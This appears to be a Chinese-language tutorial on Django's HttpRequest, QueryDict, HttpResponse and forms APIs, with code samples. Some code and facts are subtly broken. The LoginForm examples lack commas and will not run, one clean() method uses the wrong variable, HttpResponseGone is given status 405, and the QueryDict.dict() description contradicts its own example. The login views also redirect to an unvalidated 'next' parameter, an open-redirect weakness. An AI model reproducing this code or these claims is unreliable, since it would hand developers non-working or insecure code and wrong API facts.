SessionMiddleware中间件:一个可读写的类似字典的对象,表示当前会话。要保存用户状态、回话过程等等靠的就是这个中间件和这个属性。

2. HttpRequest.site
CurrentSiteMiddleware中间件:get_current_site()方法返回的Site或RequestSite的实例,代表当前站点是哪个。
Django是支持多站点的,如果同时上线了几个站点就需要为每个站点设置一个站点id。

3. HttpRequest.user
AuthenticationMiddleware中间件:表示当前登录的用户的AUTH_USER_MODEL的实例,这个模型是Django内置的Auth模块下的User模型。如果用户当前未登录则user将被设置为AnonymousUser的实例。
可以使用is_authenticated方法判断当前用户是否合法用户
if request.user.is_authenticated: pass # Do something for logged-in users.
else: pass # Do something for anonymous users.

</pre><textarea>
def test(request):
    print(request.session, request.user, request.user.is_authenticated)
    # < django.contrib.sessions.backends.db.SessionStore object at 0x7f7c75134f28> admin True
    return HttpResponse('test page')

</textarea><pre>
四、方法
1. HttpRequest.get_host()
根据HTTP_X_FORWARDED_HOST和HTTP_HOST头部信息获取请求的原始主机,如果这两个头部没有提供相应的值则使用SERVER_NAME和SERVER_PORT。
例如:"127.0.0.1:8000"
当主机位于多个代理的后面,get_host()方法将会失败,解决办法之一是使用中间件重写代理的头部

</pre><textarea>
from django.utils.deprecation import MiddlewareMixin
class MultipleProxyMiddleware(MiddlewareMixin):
    FORWARDED_FOR_FIELDS = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED_HOST', 'HTTP_X_FORWARDED_SERVER']

    def process_request(self, request):
        """Rewrites the proxy headers so that only the most recent proxy is used"""
        for field in self.FORWARDED_FOR_FIELDS:
            if field in request.META:
                if ',' in request.META[field]:
                    parts = request.META[field].split(',')
                    request.META[field] = parts[-1].strip()

</textarea><pre>
2. HttpRequest.get_port()
使用META中HTTP_X_FORWARDED_PORT和SERVER_PORT的信息返回请求的始发端口。

3. HttpRequest.get_full_path()
返回包含完整参数列表的path,例如/music/bands/the_beatles/?print=true
href="{% url 'login' %}?next={{request.get_full_path}}"

4. HttpRequest.build_absolute_uri(location)
返回location的绝对URI形式。如果location没有提供则使用request.get_full_path()的值。
例如:"https://example.com/music/bands/the_beatles/?print=true"
不鼓励在同一站点混合部署HTTP和HTTPS,如果需要将用户重定向到HTTPS,最好使用Web服务器将所有HTTP流量重定向到HTTPS。

5. HttpRequest.get_signed_cookie(key, default=RAISE_ERROR, salt='', max_age=None)
从已签名的Cookie中获取值,如果签名不合法则返回django.core.signing.BadSignature。
可选参数salt用来为密码加盐,提高安全系数,max_age参数用于检查Cookie对应的时间戳是否超时。

</pre><textarea>
>>> request.get_signed_cookie('name')
'Tony'
>>> request.get_signed_cookie('name', salt='name-salt')
'Tony' # assuming cookie was set using the same salt
>>> request.get_signed_cookie('non-existing-cookie')
...
KeyError: 'non-existing-cookie'
>>> request.get_signed_cookie('non-existing-cookie', False)
False
>>> request.get_signed_cookie('cookie-that-was-tampered-with')
...
BadSignature: ...
>>> request.get_signed_cookie('name', max_age=60)
...
SignatureExpired: Signature age 1677.3839159 > 60 seconds
>>> request.get_signed_cookie('name', False, max_age=60)
False

</textarea><pre>
6. HttpRequest.is_secure()
如果使用的是Https则返回True,表示连接是安全的。

7. HttpRequest.is_ajax()
如果请求是通过XMLHttpRequest生成的则返回True,这个方法的作用就是判断当前请求是否通过ajax机制发送过来的。

8. HttpRequest.read(size=None)
9. HttpRequest.readline()
10. HttpRequest.readlines()
11. HttpRequest.xreadlines()
12. HttpRequest.iter()
上面的几个方法都是从HttpRequest实例读取文件数据的方法。

可以将HttpRequest实例直接传递到XML解析器例如ElementTree:
import xml.etree.ElementTree as ET
for element in ET.iterparse(request): process(element)

【 QueryDict对象 】
类的原型:class QueryDict
HttpRequest对象的GET和POST属性都是一个django.http.QueryDict的实例,以下方法都可以操作request.POST和request.GET。
request.POST或request.GET的QueryDict都是不可变,只读的。如果要修改它,需要使用QueryDict.copy()获取它的一个拷贝,然后在这个拷贝上进行修改操作。

QueryDict是字典的子类,实现了Python字典数据类型的所有标准方法

1. QueryDict.init(query_string=None, mutable=False, encoding=None)
QueryDict实例化方法,QueryDict的键值是可以重复的,如果需要实例化可以修改的对象则添加参数mutable=True
>>> QueryDict('a=1&a=2&c=3')
< QueryDict: {'a': ['1', '2'], 'c': ['3']}>

2. classmethod QueryDict.fromkeys(iterable, value='', mutable=False, encoding=None)
循环可迭代对象中的每个元素作为键值,并赋予同样的值
>>> QueryDict.fromkeys(['a', 'a', 'b'], value='val')
< QueryDict: {'a': ['val', 'val'], 'b': ['val']}>

3. QueryDict.update(other_dict)
用新的QueryDict或字典更新当前QueryDict。类似dict.update(),但是追加内容,而不是更新并替换它们
>>> q = QueryDict('a=1', mutable=True)
>>> q.update({'a': '2'})
>>> q.getlist('a')
['1', '2']
>>> q['a'] # returns the last
'2'

4. QueryDict.items()
类似dict.items(),如果有重复项目,返回最近的一个,而不是都返回
>>> q = QueryDict('a=1&a=2&a=3')
>>> q.items()
[('a', '3')]

5. QueryDict.values()
类似dict.values(),但是只返回最近的值
>>> q = QueryDict('a=1&a=2&a=3')
>>> q.values()
['3']

6. QueryDict.copy()
使用copy.deepcopy()返回QueryDict对象的副本,此副本是可变的

7. QueryDict.getlist(key, default=None)
返回键对应的值列表,如果该键不存在并且未提供默认值则返回一个空列表。

8. QueryDict.setlist(key, list_)
为list_设置给定的键。

9. QueryDict.appendlist(key, item)
将键追加到内部与键相关联的列表中。

10. QueryDict.setdefault(key, default=None)
类似dict.setdefault(),为某个键设置默认值。

11. QueryDict.setlistdefault(key, default_list=None)
类似setdefault(),除了它需要的是一个值的列表而不是单个值。

12. QueryDict.lists()
类似items(),只是它将其中的每个键的值作为列表放在一起
>>> q = QueryDict('a=1&a=2&a=3')
>>> q.lists()
[('a', ['1', '2', '3'])]

13. QueryDict.pop(key)
返回给定键的值的列表,并从QueryDict中移除该键。 如果键不存在将引发KeyError
>>> q = QueryDict('a=1&a=2&a=3', mutable=True)
>>> q.pop('a')
['1', '2', '3']

14. QueryDict.popitem()
删除QueryDict任意一个键,并返回二值元组,包含键和键的所有值的列表。在一个空的字典上调用时将引发KeyError
>>> q = QueryDict('a=1&a=2&a=3', mutable=True)
>>> q.popitem()
('a', ['1', '2', '3'])

15. QueryDict.dict()
将QueryDict转换为Python的字典数据类型,并返回该字典。
如果出现重复的键,则将所有的值打包成一个列表,最为新字典中键的值。
>>> q = QueryDict('a=1&a=3&a=5')
>>> q.dict()
{'a': '5'}

16. QueryDict.urlencode(safe=None)
以url的编码格式返回数据字符串
>>> q = QueryDict('a=2&b=3&b=5')
>>> q.urlencode()
'a=2&b=3&b=5'

使用safe参数传递不需要编码的字符
>>> q = QueryDict(mutable=True)
>>> q['next'] = '/a&b/'
>>> q.urlencode(safe='/')
'next=/a%26b/'

</pre>
</div>

<div id="django_response">
<h4>HttpResponse对象</h4><pre>
类定义:class HttpResponse
HttpResponse类定义在django.http模块中,HttpRequest对象由Django自动创建,而HttpResponse对象则由程序员手动创建
编写的每个视图都要实例化、填充和返回一个HttpResponse对象,也就是函数的return值。

一、使用方法
1. 传递一个字符串
Typical usage is to pass the contents of the page, as a string, bytestring, or memoryview, to the HttpResponse constructor:
>>> from django.http import HttpResponse
>>> response = HttpResponse("Here's the text of the Web page.")
>>> response = HttpResponse("Text only, please.", content_type="text/plain")
>>> response = HttpResponse(b'Bytestrings are also accepted.')
>>> response = HttpResponse(memoryview(b'Memoryview as well.'))

可以将response看做一个类文件对象,使用wirte()方法不断地往里面增加内容
>>> response = HttpResponse()
>>> response.write("<p>Here's the text of the Web page.</p>")
>>> response.write("<p>Here's another paragraph.</p>")

2. 传递可迭代对象
HttpResponse会立即处理这个迭代器,并把它的内容存成字符串,最后废弃这个迭代器,比如文件在读取后会立刻调用close()方法关闭文件。

3. 设置头部字段
可以把HttpResponse对象当作一个字典一样,在其中增加和删除头部字段
>>> response = HttpResponse()
>>> response['Age'] = 120
>>> del response['Age']

与字典不同,如果要删除的头部字段如果不存在,del不会抛出KeyError异常。
HTTP的头部字段中不能包含换行,所以如果提供的头部字段值包含换行符CR或LF将会抛出BadHeaderError异常。

4. 告诉浏览器将响应视为文件附件
让浏览器以文件附件的形式处理响应, 需要声明content_type类型和设置Content-Disposition头信息

# 给浏览器返回一个微软电子表格
>>> response = HttpResponse(my_data, content_type='application/vnd.ms-excel')
>>> response['Content-Disposition'] = 'attachment; filename="foo.xls"'

二、属性
1. HttpResponse.content
响应的内容,bytes类型

2. HttpResponse.charset
编码的字符集,如果没指定将会从content_type中解析出来

3. HttpResponse.status_code
响应的状态码,比如200

4. HttpResponse.reason_phrase
响应的HTTP原因短语,使用标准原因短语
除非明确设置,否则reason_phrase由status_code的值决定。

5. HttpResponse.streaming
这个属性的值总是False。由于这个属性的存在,使得中间件能够区别对待流式响应和常规响应。

6. HttpResponse.closed
如果响应已关闭,那么这个属性的值为True

三、 方法
1. HttpResponse.__init__(content='', content_type=None, status=200, reason=None, charset=None)
响应的实例化方法,使用content参数和content-type实例化一个HttpResponse对象。
content is most commonly an iterator, bytestring, memoryview, or string. Other types will be converted to a bytestring by encoding their string representation. Iterators should return strings or bytestrings and those will be joined together to form the content of the response
content_type可选,用于填充HTTP的Content-Type头部,默认由DEFAULT_CONTENT_TYPE和DEFAULT_CHARSET设置组成:text/html; charset=utf-8。
status是响应的状态码。
reason是HTTP响应短语。
charset是编码方式。

2. HttpResponse.has_header(header)
检查头部中是否有给定的名称,不区分大小写,返回True或 False。

3. HttpResponse.setdefault(header, value)
设置一个头部,除非该头部已经设置过了。

4. HttpResponse.set_cookie(key, value='', max_age=None, expires=None, path='/', domain=None, secure=None, httponly=False)
设置一个Cookie,参数与Python标准库中的Morsel.Cookie对象相同。
max_age: 生存周期,以秒为单位。
expires:到期时间。
domain: 用于设置跨域的Cookie,例如domain=".lawrence.com"将设置一个www.lawrence.com、blogs.lawrence.com和calendars.lawrence.com都可读的Cookie,否则Cookie将只能被设置它的域读取。
如果想阻止客服端的Js访问Cookie,可以设置httponly=True。

5. HttpResponse.set_signed_cookie(key, value, salt='', max_age=None, expires=None, path='/', domain=None, secure=None, httponly=True)
与set_cookie()类似,但是在设置之前将对cookie进行加密签名。通常与HttpRequest.get_signed_cookie()一起使用。

6. HttpResponse.delete_cookie(key, path='/', domain=None)
删除Cookie中指定的key。
由于Cookie的工作方式,path和domain应该与set_cookie()中使用的值相同,否则Cookie不会删掉。

7. HttpResponse.write(content)
将HttpResponse实例看作类似文件的对象,往里面添加内容。

8. HttpResponse.flush()
清空HttpResponse实例的内容。

9. HttpResponse.tell()
将HttpResponse实例看作类似文件的对象,移动位置指针。

10. HttpResponse.getvalue()
返回HttpResponse.content的值,此方法将HttpResponse实例看作是一个类似流的对象

11. HttpResponse.readable()
值始终为False

12. HttpResponse.seekable()
值始终为False

13. HttpResponse.writable()
值始终为True

14. HttpResponse.writelines(lines)
将一个包含行的列表写入响应对象中,不添加分行符

四、HttpResponse的子类
Django包含了一系列的HttpResponse衍生类即子类用来处理不同类型的HTTP响应。与HttpResponse相同, 这些衍生类存在于django.http之中。

class HttpResponseRedirect:重定向,返回302状态码,已经被redirect()替代。
class HttpResponsePermanentRedirect:永久重定向,返回301状态码。
class HttpResponseNotModified:未修改页面,返回304状态码。
class HttpResponseBadRequest:错误的请求,返回400状态码。
class HttpResponseNotFound:页面不存在,返回404状态码。
class HttpResponseForbidden:禁止访问,返回403状态码。
class HttpResponseNotAllowed:禁止访问,返回405状态码。
class HttpResponseGone:过期,返回405状态码。
class HttpResponseServerError:服务器错误,返回500状态码。

五、JsonResponse类
class JsonResponse(data,encoder = DjangoJSONEncoder,safe = True,json_dumps_params = None ,** kwargs)
JsonResponse是HttpResponse的一个子类,是Django提供的用于创建JSON编码类型响应的快捷类。

它从父类继承大部分行为,并具有以下不同点:
它的默认Content-Type头部设置为application/json。
它的第一个参数data,通常应该为一个字典数据类型。 如果safe参数设置为False则可以是任何可JSON序列化的对象。
encoder默认为django.core.serializers.json.DjangoJSONEncoder,用于序列化数据。
布尔类型参数safe默认为True表示data参数只允许dict实例,设置为False则可以传递任何对象进行序列化
>>> from django.http import JsonResponse
>>> response = JsonResponse({'foo': 'bar'})
>>> response.content
b'{"foo": "bar"}'

若要序列化非dict对象,必须设置safe参数为False,如果不传递safe=False,将抛出一个TypeError
>>> response = JsonResponse([1, 2, 3], safe=False)

如果需要使用不同的JSON编码器类,可以传递encoder参数给构造函数:
>>> response = JsonResponse(data, encoder=MyJSONEncoder)

六、StreamingHttpResponse类
StreamingHttpResponse类被用来从Django响应一个流式对象到浏览器。如果生成的响应太长或占用的内存较大,这么做可能更有效率,例如它对于生成大型的CSV文件非常有用。
StreamingHttpResponse不是HttpResponse的衍生类(子类),因为它实现了完全不同的应用程序接口,但除了几个明显不同的地方,两者几乎完全相同

七、FileResponse
文件类型响应,通常用于给浏览器返回一个文件附件。
FileResponse是StreamingHttpResponse的衍生类,为二进制文件专门做了优化。
FileResponse需要通过二进制模式打开文件
>>> from django.http import FileResponse
>>> response = FileResponse(open('myfile.png', 'rb'))

</pre>
</div>

<div id="django_form">
<h4>Django表单</h4><pre>
处理表单时只会用到POST和GET方法
GET方法将用户数据以键=值的形式,以&符号组合在一起成为一个整体字符串,最后添加前缀?,将字符串拼接到url内,生成一个类似https://docs.djangoproject.com/search/?q=forms&release=1的URL。
而对于POST方法,浏览器会组合表单数据对它们进行编码,然后打包将它们发送到服务器,数据不会出现在url中。
GET方法通常用来请求数据,不适合密码表单这一类保密信息的发送,也不适合数据量大的表单和二进制数据。对于这些类型的数据,应该使用POST方法。但GET特别适合网页搜索的表单,因为这种表示一个GET请求的URL很容易地设置书签、分享和重新提交。

通常情况下需要自己手动在HTML页面中,编写form标签和其内的其它元素。但这费时费力,且有可能写得不太恰当,数据验证也麻烦。Django在内部集成了一个表单模块,专门帮助快速处理表单相关的内容。Django的表单模块提供了下面三个主要功能:
准备和重构数据用于页面渲染
为数据创建HTML表单元素
接收和处理用户从表单发送过来的数据

django用Form类描述html表单,帮助和简化操作
1、接收和处理用户提交的数据,可检查提交的数据,可将数据转换成python的数据类型
2、可自动生成HTML表单代码

编写表单类
编写Django的form表单非常类似在模型系统里编写一个模型,模型中一个字段代表数据表的一列,而form表单中的一个字段代表form中的一个input元素。
可以通过Django提供的Form类来生成表单,不再需要手动在HTML中编写。
首先在当前app内新建一个forms.py文件就像views.py、models.py等,然后输入下面的内容:

</pre><textarea>
# myapp/forms.py
from django import forms     # 导入forms模块

class NameForm(forms.Form):  # 所有的表单类都要继承forms.Form类
    your_name = forms.CharField(label='Your name', max_length=100)

</textarea><pre>
每个表单字段都有自己的字段类型比如CharField,它们分别对应一种form元素中的表单元素,这一点和Django模型系统的设计非常相似。
label用于设置说明标签label
max_length限制最大长度为100,它同时起到两个作用,一是在浏览器页面限制用户输入不可超过100个字符,二是在后端服务器验证用户输入的长度不可超过100。
由于浏览器页面是可以被篡改、伪造、禁用、跳过的,所有的HTML手段的数据验证只能防止意外不能防止恶意行为,没有安全保证,破坏分子完全可跳过浏览器的防御手段伪造发送请求,所以在服务器后端必须将前端当做"裸机"来对待,再次进行完全彻底的数据验证和安全防护

每个Django表单的实例都有一个内置的is_valid()方法,用来验证接收的数据是否合法。所有数据都合法则该方法将返回True,并将所有的表单数据转存到其字典类型数据的属性cleaned_data中
通过表单的is_bound属性可以获知一个表单已经绑定了数据,还是一个空表

当将上面的表单渲染成真正的HTML元素,其内容如下:
< label for="your_name">Your name: < /label>
< input id="your_name" type="text" name="your_name" maxlength="100" required />
它不包含form标签本身以及提交按钮,这样方便自己控制表单动作和CSS,JS以及其它类似bootstrap框架的嵌入

Python内置了一个locals()函数,它返回当前所有的本地变量字典,可以偷懒的将这作为render函数的数据字典参数值,就不用费劲去构造一个形如{'message':message, 'form': form}的字典了,这样大大方便了,但同时也可能往模板传入了一些多余的变量数据,造成数据冗余降低效率

</pre>在视图中实例化编写好的表单类<textarea>
# myapp/views.py
from django.shortcuts import render
from django.http import HttpResponseRedirect
from .forms import NameForm

def get_name(request):
    # 对于POST方法,接收表单数据,并验证
    if request.method == 'POST':
        # 接受request.POST参数构造form类的实例
        form = NameForm(request.POST)
        # 验证数据是否合法,如果数据合法则按照正常业务逻辑继续执行下去,如果不合法则返回一个包含先前数据的表单给前端页面,方便用户修改
        if form.is_valid():
            # 处理form.cleaned_data中的数据
            your_name = form.cleaned_data.get('your_name')
            # ...
            # 重定向到一个新的URL
            return HttpResponseRedirect('/myapp/thanks/')
        else:
            # 如果验证不通过则返回一个包含先前数据的表单给前端页面方便用户修改,即它会保留先前填写的数据内容,而不是返回一个空表
            return render(request, 'name.html', locals())

    # 对于GET方法请求页面时,返回空的表单让用户可以填入数据
    else:
        form = NameForm()

    return render(request, 'name.html', {'form': form})

</textarea><pre>
路由设置
path('name/', views.get_name, name='name'),

模板处理表单

</pre><textarea>
< form action="/myapp/name/" method="post">
    {% csrf_token %}  # 使用POST的方法时必须添加{% csrf_token %}标签,用于处理csrf安全机制
    {{ form }}        # {{ form }}代表Django生成其它所有的form标签元素,默认Django支持HTML5的表单验证功能如邮箱地址验证、必填项目验证等
    < input type="submit" value="Submit" />
< /form>

</textarea><pre>
Django的表单模块内置了许多表单字段
BooleanField
CharField
ChoiceField
TypedChoiceField
DateField
DateTimeField
DecimalField
DurationField
EmailField
FileField
FilePathField
FloatField
ImageField
IntegerField
GenericIPAddressField
MultipleChoiceField
TypedMultipleChoiceField
NullBooleanField
RegexField
SlugField
TimeField
URLField
UUIDField
ComboField
MultiValueField
SplitDateTimeField
ModelChoiceField
ModelMultipleChoiceField

每一个表单字段类型都对应一种Widget类,每一种Widget类都对应了HMTL语言中的一种input元素类型,比如< input type="text">。需要在HTML中实际使用什么类型的input就需要在Django的表单字段中选择相应的field。比如要一个< input type="text">可以选择一个CharField。

</pre><textarea>
from django import forms

class ContactForm(forms.Form):
    subject = forms.CharField(max_length=100)
    message = forms.CharField(widget=forms.Textarea)
    sender = forms.EmailField()
    cc_myself = forms.BooleanField(required=False)

# 一旦表单接收数据并验证通过了,那么就可以从form.cleaned_data字典中读取所有的表单数据
# views.py
from django.core.mail import send_mail

if form.is_valid():
    subject = form.cleaned_data['subject']
    message = form.cleaned_data['message']
    sender = form.cleaned_data['sender']
    cc_myself = form.cleaned_data['cc_myself']

    recipients = ['info@example.com']
    if cc_myself:
        recipients.append(sender)

    print (subject, message, sender, recipients)
    send_mail(subject, message, sender, recipients)
    return HttpResponseRedirect('/thanks/')

</textarea><pre>
使用表单模板
1.表单渲染格式
通过{{ form }}模板语言简单地将表单渲染到HTML页面中,Django自动为每个input元素设置了id对应label的for参数,实际上有更多的方式:
{{ form.as_table }} 将表单渲染成一个表格元素,每个输入框作为一个tr标签,要自己手动编写table标签
{{ form.as_p }} 将表单的每个输入框包裹在一个p标签内tags
{{ form.as_ul }} 将表单渲染成一个列表元素,每个输入框作为一个li标签,要自己手动编写ul标签

2.手动渲染表单字段
直接{{ form }}虽然好,但是往往并不是想要的,比如要使用CSS和JS,比如要引入Bootstarps框架,这些都需要对表单内的input元素进行额外控制,此时手动渲染字段就可以了。

</pre>可以通过{{ form.fieldName }}获取每一个字段,然后分别渲染<textarea>
{{ form.non_field_errors }}
< div class="fieldWrapper">
    {{ form.subject.errors }}
    < label for="{{ form.subject.id_for_label }}">Email subject:< /label>
    {{ form.subject }}
< /div>
< div class="fieldWrapper">
    {{ form.message.errors }}
    < label for="{{ form.message.id_for_label }}">Your message:< /label>
    {{ form.message }}
< /div>
< div class="fieldWrapper">
    {{ form.sender.errors }}
    < label for="{{ form.sender.id_for_label }}">Your email address:< /label>
    {{ form.sender }}
< /div>
< div class="fieldWrapper">
    {{ form.cc_myself.errors }}
    < label for="{{ form.cc_myself.id_for_label }}">CC yourself?< /label>
    {{ form.cc_myself }}
< /div>

# 其中的label标签甚至可以用label_tag()方法来生成,于是可以简写成下面的样子:
< div class="fieldWrapper">
    {{ form.subject.errors }}
    {{ form.subject.label_tag }}
    {{ form.subject }}
< /div>

</textarea><pre>
3. 渲染表单错误信息:
使用{{ form.fieldName.errors }}模板语法在表单里处理错误信息,每一个表单字段的错误其实会实际生成一个无序列表:

</pre><textarea>
< ul class="errorlist">< li>Sender is required.< /li>< /ul>

# 这个列表有个默认的CSS样式类errorlist,如果想进一步定制这个样式,可以循环错误列表里的内容,然后单独设置样式:
{% if form.subject.errors %}
    < ol>
    {% for error in form.subject.errors %}
        < li>< strong>{{ error|escape }}< /strong>< /li>
    {% endfor %}
    < /ol>
{% endif %}

</textarea><pre>
一切非字段的错误信息,比如表单的错误,隐藏字段的错误都保存在{{ form.non_field_errors }}中,把它放在了表单的外围上面,它将被按下面的HTML和CSS格式渲染:
< ul class="errorlist nonfield">< li>Generic validation error< /li>< /ul>

4. 循环表单的字段:
如果表单字段有相同格式的HMTL表现,那么完全可以循环生成,不必要手动的编写每个字段,减少冗余和重复代码,只需要使用模板语言中的{% for %}循环

</pre><textarea>
{% for field in form %}
    < div class="fieldWrapper">
        {{ field.errors }}
        {{ field.label_tag }} {{ field }}
        {% if field.help_text %}
            < p class="help">{{ field.help_text|safe }}< /p>
        {% endif %}
    < /div>
{% endfor %}

</textarea><pre>
下表是{{ field }}中非常有用的属性,这些都是Django内置的模板语言提供的方便:
{{ field.label }}   字段对应的label信息
{{ field.label_tag }}   自动生成字段的label标签,注意与{{ field.label }}的区别。
{{ field.id_for_label }}    自定义字段标签的id
{{ field.value }}   当前字段的值,比如一个Email字段的值someone@example.com
{{ field.html_name }}   指定字段生成的input标签中name属性的值
{{ field.help_text }}   字段的帮助信息
{{ field.errors }}  包含错误信息的元素
{{ field.is_hidden }}   用于判断当前字段是否为隐藏的字段,如果是则返回True
{{ field.field }}   返回字段的参数列表。例如{{ char_field.field.max_length }}

5. 不可见字段的特殊处理:
很多时候表单中会有一些隐藏的不可见的字段,需要让它在任何时候都仿佛不存在一般,比如有错误的时候,如果在页面上显示了不可见字段的错误信息,那么用户会很迷惑是哪来的呢？所以通常是不显示不可见字段的错误信息的。

Django提供了两种独立的方法,用于循环那些不可见的和可见的字段:hidden_fields()和visible_fields()

</pre><textarea>
{# 循环那些不可见的字段 #}
{% for hidden in form.hidden_fields %}
    {{ hidden }}
{% endfor %}
{# 循环可见的字段 #}
{% for field in form.visible_fields %}
    < div class="fieldWrapper">
        {{ field.errors }}
        {{ field.label_tag }} {{ field }}
    < /div>
{% endfor %}

</textarea><pre>
6. 重用表单模板
如果在HTML文件中多次使用同一种表单模板,那么完全可以把表单模板存成一个独立的HTML文件,然后在别的HTML文件中通过include模板语法将其包含进来

</pre><textarea>
# 实际的页面文件中:
{% include "form_snippet.html" %}

# 单独的表单模板文件form_snippet.html:
{% for field in form %}
    < div class="fieldWrapper">
        {{ field.errors }}
        {{ field.label_tag }} {{ field }}
    < /div>
{% endfor %}

</textarea><pre>
如果页面同时引用了好几个不同的表单模板,那么为了防止冲突,可以使用with参数,给每个表单模板取个别名:
{% include "form_snippet.html" with form=comment_form %}
在使用的时候就是:
{% for field in comment_form %}
如果经常做这些重用的工作,建议考虑自定义一个内联标签

【 Django表单API 】
Form要么是绑定了数据的,要么是未绑定数据的。
如果是绑定的,那么它能够验证数据并渲染表单及其数据,然后生成HTML表单。如果未绑定则无法进行验证,因为没有数据可以验证,但它仍然可以以HTML形式呈现空白表单。

表单类原型:class Form
若要创建一个未绑定的Form实例,只需简单地实例化该类:
f = ContactForm()

若要绑定数据到表单,可以将数据以字典的形式传递给Form类的构造函数,在这个字典中键为字段的名称对应于Form类中的字段,值为需要验证的数据
data = {'subject': 'hello', 'message': 'Hi there', 'sender': 'foo@example.com', 'cc_myself': True}
f = ContactForm(data)

表单的绑定属性
Form.is_bound:
如果需要区分绑定的表单和未绑定的表单,可以检查下表单的is_bound属性值:
>>> f = ContactForm()
>>> f.is_bound  # False
>>> f = ContactForm({'subject': 'hello'})
>>> f.is_bound  # True

传递一个空的字典将创建一个带有空数据的绑定的表单:
>>> f = ContactForm({})
>>> f.is_bound  # True

如果有一个绑定的Form实例但是想改下数据,或想给一个未绑定的Form表单绑定某些数据,需要创建另外一个Form实例,因为Form实例的数据没是自读的,Form实例一旦创建,它的数据将不可变。

使用表单验证数据
1. Form.clean()
如果要自定义验证功能,那么需要重新实现这个clean方法。

2. Form.is_valid()
调用is_valid()方法来执行绑定表单的数据验证工作,并返回一个表示数据是否合法的布尔值。
>>> data = {'subject': 'hello', 'message': 'Hi there', 'sender': 'foo@example.com', 'cc_myself': True}
>>> f = ContactForm(data)
>>> f.is_valid() # True

试下非法的数据,下面的情形中subject为空(默认所有字段都是必需的)且sender是一个不合法的邮件地址:
>>> data = {'subject': '', 'message': 'Hi there', 'sender': 'invalid email address', 'cc_myself': True}
>>> f = ContactForm(data)
>>> f.is_valid() # False

3. Form.errors
表单的errors属性保存了错误信息字典:
>>> f.errors
{'sender': ['Enter a valid email address.'], 'subject': ['This field is required.']}
在这个字典中,键为字段的名称,值为错误信息的Unicode字符串组成的列表。错误信息保存在列表中是因为字段可能有多个错误信息。

4. Form.errors.as_data()
返回一个字典,它将字段映射到原始的ValidationError实例。
>>> f.errors.as_data()
{'sender': [ValidationError(['Enter a valid email address.'])], 'subject': [ValidationError(['This field is required.'])]}

5. Form.errors.as_json(escape_html=False)
返回JSON序列化后的错误信息字典。
>>> f.errors.as_json()
{"sender": [{"message": "Enter a valid email address.", "code": "invalid"}], "subject": [{"message": "This field is required.", "code": "required"}]}

6. Form.add_error(field, error)
向表单特定字段添加错误信息。
field参数为字段的名称。如果值为None,error将作为Form.non_field_errors()的一个非字段错误。

</pre><textarea>
class LoginForm(forms.Form):
    username = forms.CharField(
        label="用户名",
        max_length = 30,
        min_length = 3
        widget=forms.TextInput(attrs={'class': 'form-contrl', 'placeholder': '请输入3-30为的用户名'})
    )
    password = forms.CharField(
        label="密码",
        min_length = 6
        widget=forms.PasswordInput(attrs={'class': 'form-contrl', 'placeholder': '请输入密码'})
    )

def login(request):
    if request.method == 'POST':
        login_form = LoginForm(request.POST)
        if login_form.is_valid():
            username = login_form.cleaned_data['username']
            password = login_form.cleaned_data['password']
            user = auth.authenticate(username=username, password=password)
            if user:
                auth.login(request, user)
                return redirect(request.GET.get('next', reverse('home'))) # 登录成功的跳转referer写在表单action的next参数
            else:
                login_form.add_error(None, '用户名或密码错误')
    else:
        login_form = LoginForm()
    return render(request, 'login.html', {'login_form': login_form})      # 所有登录失败的情况都会执行该句,且携带错误信息

### 方法2
class LoginForm(forms.Form):
    username = forms.CharField(label="用户名")
    password = forms.CharField(label="密码", widget=forms.PasswordInput)

    def clean(self):
        username = login_form.cleaned_data['username']
        password = login_form.cleaned_data['password']
        user = auth.authenticate(username=username, password=password)
        if user:
            self.cleaned_data['user'] = user
        else:
            raise forms.ValidationError('用户名或密码错误')
        return self.cleaned_data

def login(request):
    if request.method == 'POST':
        login_form = LoginForm(request.POST)
        if login_form.is_valid():
            auth.login(request, login_form.cleaned_data['user'])
            return redirect(request.GET.get('next', reverse('home'))) # 登录成功的跳转referer写在表单action的next参数
    else:
        login_form = LoginForm()
    return render(request, 'login.html', {'login_form': login_form})      # 所有登录失败的情况都会执行该句,且携带错误信息

</textarea><pre>
7. Form.has_error(field, code=None)
判断某个字段是否具有指定code的错误。当code为None时,如果字段有任何错误它都将返回True。

8. Form.non_field_errors()
返回Form.errors中不是与特定字段相关联的错误。

9. 对于没有绑定数据的表单
验证没有绑定数据的表单是没有意义的
>>> f = ContactForm()
>>> f.is_valid() # False
>>> f.errors # {}

检查表单数据是否被修改
1. Form.has_changed()
当需要检查表单的数据是否从初始数据发生改变时可以使用has_changed()方法。
>>> data = {'subject': 'hello', 'message': 'Hi there', 'sender': 'foo@example.com', 'cc_myself': True}
>>> f = ContactForm(data, initial=data)
>>> f.has_changed() # False

提交表单后可以重新构建表单并提供初始值,进行比较:
>>> f = ContactForm(request.POST, initial=data)
>>> f.has_changed()
如果request.POST与initial中的数据有区别则返回True,否则返回False。

2. Form.changed_data
返回有变化的字段的列表。
>>> f = ContactForm(request.POST, initial=data)
>>> if f.has_changed(): print("The following fields changed: %s" % ", ".join(f.changed_data))

访问表单中的字段
通过fileds属性访问表单的字段:
>>> for row in f.fields.values(): print(row)
< django.forms.fields.CharField object at 0x7ffaac632510>
< django.forms.fields.URLField object at 0x7ffaac632f90>
< django.forms.fields.CharField object at 0x7ffaac3aa050>
>>> f.fields['name']
< django.forms.fields.CharField object at 0x7ffaac6324d0>

可以修改Form实例的字段来改变字段在表单中的表示:
>>> f.as_table().split('\n')[0]
'< tr>< th>Name:< /th>< td>< input name="name" type="text" value="instance" required />< /td>< /tr>'
>>> f.fields['name'].label = "Username"
>>> f.as_table().split('\n')[0]
'< tr>< th>Username:< /th>< td>< input name="name" type="text" value="instance" required />< /td>< /tr>'

不要改变base_fields属性,因为一旦修改将影响同一个Python进程中接下来所有的ContactForm实例:
>>> f.base_fields['name'].label = "Username"
>>> another_f = CommentForm(auto_id=False)
>>> another_f.as_table().split('\n')[0]
'< tr>< th>Username:< /th>< td>< input name="name" type="text" value="class" required />< /td>< /tr>'

访问cleaned_data
Form.cleaned_data
Form类中的每个字段不仅负责验证数据,还负责将它们转换为正确的格式。例如DateField将输入转换为Python的datetime.date对象。无论传递的是普通字符串'1994-07-15'、DateField格式的字符串、datetime.date对象、还是其它格式的数字,Django将始终把它们转换成datetime.date对象。

一旦创建一个Form实例并通过验证后就可以通过它的cleaned_data属性访问干净的数据:
>>> data = {'subject': 'hello', 'message': 'Hi there', 'sender': 'foo@example.com', 'cc_myself': True}
>>> f = ContactForm(data)
>>> f.is_valid()   # True
>>> f.cleaned_data # {'cc_myself': True, 'message': 'Hi there', 'sender': 'foo@example.com', 'subject': 'hello'}

